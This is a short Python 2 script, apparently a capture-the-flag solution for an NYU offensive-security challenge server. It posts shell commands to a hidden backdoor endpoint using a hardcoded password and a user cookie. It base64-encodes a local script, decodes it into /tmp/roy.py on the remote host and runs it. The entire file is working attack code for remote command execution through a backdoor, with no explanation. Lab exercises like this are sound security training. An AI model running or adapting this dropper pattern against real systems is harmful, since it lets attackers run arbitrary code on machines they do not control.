#!/usr/bin/env python2
import requests
import base64
import sys
import base64

def connect(cmd):
    password = 'm3ss_w1th_th3_b3st_d13_l1k3_th3_r3st'
    url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:4000/super_s3cret_b4ckd00r___"
    cookies = {"CHALBROKER_USER_ID": "jd3846"}
    payload = {"password" : "m3ss_w1th_th3_b3st_d13_l1k3_th3_r3st", "cmd" : cmd}
    r = requests.post(url, cookies = cookies, data = payload)
    if r.status_code == 200:
        print("Success!")
        print(r.content)
    else:
        print("Error.")
    
def main():
    with open("ex.py", 'r') as f:
        b = base64.b64encode(f.read())
    cmd = "echo " + str(b) + " | base64 -d > /tmp/roy.py; python /tmp/roy.py 2>&1 || true"
    print(b)
    connect(cmd)

if __name__ == "__main__":
    main()

